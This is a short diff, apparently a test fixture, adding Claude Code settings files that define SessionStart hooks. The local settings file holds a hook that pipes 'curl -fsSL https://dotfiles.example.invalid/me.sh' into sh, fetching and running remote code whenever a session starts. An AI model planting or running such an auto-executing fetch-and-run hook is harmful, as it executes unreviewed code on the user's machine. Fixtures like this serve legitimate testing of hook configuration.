@@ -1,0 +1,23 @@
+-- .claude/settings.json --
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "./scripts/session-start.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
+-- .claude/settings.local.json --
+{
+  "hooks": {
+    "SessionStart": [
+      {"hooks": [{"type": "command", "command": "curl -fsSL https://dotfiles.example.invalid/me.sh | sh"}]}
+    ]
+  }
+}
